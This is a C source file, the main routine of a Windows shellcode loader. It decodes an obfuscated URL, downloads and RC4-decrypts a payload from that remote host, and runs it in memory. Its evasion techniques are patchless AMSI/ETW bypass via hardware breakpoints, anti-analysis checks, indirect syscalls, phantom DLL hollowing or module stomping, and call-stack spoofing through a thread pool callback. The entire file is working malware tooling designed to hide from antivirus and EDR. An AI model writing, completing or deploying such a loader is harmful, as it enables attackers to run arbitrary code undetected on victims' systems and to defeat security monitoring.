// =============================================
// main.c - Shellcode Loader
//
// Evasion:  Patchless AMSI/ETW (VEH + HW breakpoints)
// Memory:   Phantom DLL Hollowing → Module Stomp → NtAllocateVirtualMemory
// Thread:   Thread pool callback (TpAllocWork/TpPostWork)
// Stack:    Call gadget injection + tail-call spoofing
// Syscalls: Indirect with randomized gadget pool
// =============================================

#include "Common.h"

// Instantiate encoded data (auto-generated in Payload.h)
static unsigned char EncodedUrl[]    = INIT_ENCODED_URL;
static unsigned char ProtectedKey[]  = INIT_PROTECTED_KEY;

// -----------------------------------------------
// Decode XOR-encoded URL string at runtime
// -----------------------------------------------
static VOID DecodeUrl(OUT PCHAR pOut, IN PBYTE pEncoded, IN DWORD dwLen, IN BYTE bKey) {
    for (DWORD i = 0; i < dwLen; i++)
        pOut[i] = (CHAR)(pEncoded[i] ^ bKey);
}

// -----------------------------------------------
// Entry Point
// -----------------------------------------------
int Main(VOID) {

    NTAPI_FUNC  NtApis  = { 0 };
    API_HASHING WinApis = { 0 };
    NTSTATUS    STATUS  = 0x00;

    // --- IAT Camouflage ---
    IatCamouflage();

    // --- Anti-Analysis (skipped in DEBUG builds) ---
#ifndef DEBUG
    if (!AntiAnalysis())
        return 0;
#endif

    // --- Initialize indirect syscall engine ---
    // Builds gadget pool (all syscall;ret in ntdll) + resolves 5 NT syscalls
    if (!InitializeNtSyscalls(&NtApis))
        return 0;

    // --- Initialize WinAPI function pointers (PEB hash walking) ---
    if (!InitializeWinApis(&WinApis))
        return 0;

    // --- Patchless AMSI/ETW bypass ---
    // VEH + hardware breakpoints on EtwEventWrite/AmsiScanBuffer
    // NtContinue sets DR0/DR1 without ETW-TI telemetry
    PatchlessAmsiEtw(&WinApis);

    // --- Key recovery ---
    PBYTE pRealKey = NULL;
    if (!BruteForceDecryption(HINT_BYTE, ProtectedKey, KEY_SIZE, &pRealKey))
        return 0;

    // --- Download encrypted payload ---
    PBYTE pPayload     = NULL;
    DWORD dwPayloadSize = 0;

    CHAR szUrl[512] = { 0 };
    DecodeUrl(szUrl, EncodedUrl, URL_LENGTH, URL_XOR_KEY);
    LOG("[*] Downloading payload...");
    if (!DownloadPayload(&WinApis, szUrl, &pPayload, &dwPayloadSize)) {
        HeapFree(GetProcessHeap(), 0, pRealKey);
        return 0;
    }
    MemSet(szUrl, 0, sizeof(szUrl));
    LOG("[+] Payload loaded");

    // --- Decrypt ---
    if (!Rc4DecryptPayload(&WinApis, pPayload, dwPayloadSize, pRealKey, KEY_SIZE)) {
        HeapFree(GetProcessHeap(), 0, pPayload);
        HeapFree(GetProcessHeap(), 0, pRealKey);
        return 0;
    }
    MemSet(pRealKey, 0, KEY_SIZE);
    HeapFree(GetProcessHeap(), 0, pRealKey);

    // ============================================================
    // Stage 1: Shellcode Placement (3-tier fallback)
    //
    // 1. Phantom DLL Hollowing (NTFS Transactions)
    //    - Section backed by rolled-back transacted file
    //    - EDR can't verify memory against disk (FILE_OBJECT mismatch)
    //    - Requires write access to System32 DLL (elevated)
    //
    // 2. Module Stomping
    //    - LoadLibrary + overwrite .text section
    //    - Memory attributed to signed DLL
    //    - Detectable by EDR integrity checks (disk vs memory)
    //
    // 3. NtAllocateVirtualMemory (last resort)
    //    - Private RWX memory (most suspicious)
    //    - Always works regardless of shellcode size
    // ============================================================

    PVOID pExec   = NULL;
    BOOL  bPlaced = FALSE;

    // Try phantom DLL hollowing first
    bPlaced = PhantomDllHollow(&WinApis, &NtApis, pPayload, dwPayloadSize, &pExec);
    if (bPlaced) {
        LOG("[+] Shellcode placed via phantom DLL hollowing");
    }

    // Fall back to module stomping
    if (!bPlaced) {
        bPlaced = ModuleStomp(&WinApis, pPayload, dwPayloadSize, &pExec);
        if (bPlaced) {
            LOG("[+] Shellcode placed via module stomping");
        }
    }

    // Last resort: direct allocation
    if (!bPlaced) {
        LOG("[*] Fallback to NtAllocateVirtualMemory");

        SIZE_T sRegion = (SIZE_T)dwPayloadSize;
        SET_SYSCALL(NtApis.NtAllocateVirtualMemory);
        STATUS = RunSyscall(
            (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pExec,
            (ULONG_PTR)0, (ULONG_PTR)&sRegion,
            (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE), (ULONG_PTR)PAGE_READWRITE,
            0, 0, 0, 0, 0, 0
        );
        if (!NT_SUCCESS(STATUS)) {
            HeapFree(GetProcessHeap(), 0, pPayload);
            return 0;
        }

        MemCopy(pExec, pPayload, dwPayloadSize);

        ULONG   dwOldProt  = 0;
        SIZE_T  sProtSize  = (SIZE_T)dwPayloadSize;
        PVOID   pProtAddr  = pExec;

        SET_SYSCALL(NtApis.NtProtectVirtualMemory);
        STATUS = RunSyscall(
            (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pProtAddr,
            (ULONG_PTR)&sProtSize, (ULONG_PTR)PAGE_EXECUTE_READWRITE,
            (ULONG_PTR)&dwOldProt,
            0, 0, 0, 0, 0, 0, 0
        );
        if (!NT_SUCCESS(STATUS)) {
            HeapFree(GetProcessHeap(), 0, pPayload);
            return 0;
        }
    }

    // Wipe original payload from heap
    MemSet(pPayload, 0, dwPayloadSize);
    HeapFree(GetProcessHeap(), 0, pPayload);

    // ============================================================
    // Stage 2: Call Stack Spoofing + Callback Execution
    //
    // Find a 'call rbx' (FF D3) gadget in ntdll to inject a
    // legitimate stack frame. Combined with module stomping or
    // phantom hollowing, the full call stack looks clean:
    //
    //   shellcode RIP  (in stomped/phantom DLL .text)
    //   -> gadget site  (in ntdll — 'call rbx' return addr)
    //   -> TppWorkpExecute     (ntdll)
    //   -> TppWorkerThread     (ntdll)
    //   -> RtlUserThreadStart  (ntdll)
    // ============================================================

    // Find call gadget in ntdll for stack frame injection
    BYTE xNtdll[] = XSTR_NTDLL_DLL;
    DEOBF(xNtdll);
    PVOID pNtdll = (PVOID)WinApis.pGetModuleHandleA((LPCSTR)xNtdll);
    PVOID pCallGadget = NULL;
    if (pNtdll)
        pCallGadget = FindCallGadget(pNtdll);

    // Store target + gadget for the ASM callback wrapper
    SetSpoofTarget(pExec, pCallGadget);

    // Resolve thread pool functions from ntdll (hash-based)
    fnTpAllocWork  pTpAllocWork  = (fnTpAllocWork)FetchExportAddress(pNtdll, TpAllocWork_JOAAT);
    fnTpPostWork   pTpPostWork   = (fnTpPostWork)FetchExportAddress(pNtdll, TpPostWork_JOAAT);

    if (!pTpAllocWork || !pTpPostWork)
        return 0;

    // Create thread pool work item with SpoofCallback as the callback
    PVOID pWork = NULL;
    STATUS = pTpAllocWork(&pWork, (PVOID)SpoofCallback, NULL, NULL);
    if (!NT_SUCCESS(STATUS) || !pWork)
        return 0;

    LOG("[*] Executing via thread pool callback (spoofed stack)...");

    // Post work — triggers SpoofCallback on a thread pool thread
    pTpPostWork(pWork);

    // Keep process alive with infinite delay (indirect syscall)
    LARGE_INTEGER li;
    li.QuadPart = -315360000000000LL; // ~1 year in 100ns units
    while (TRUE) {
        SET_SYSCALL(NtApis.NtDelayExecution);
        RunSyscall(
            (ULONG_PTR)FALSE, (ULONG_PTR)&li,
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0
        );
    }

    return 0;
}
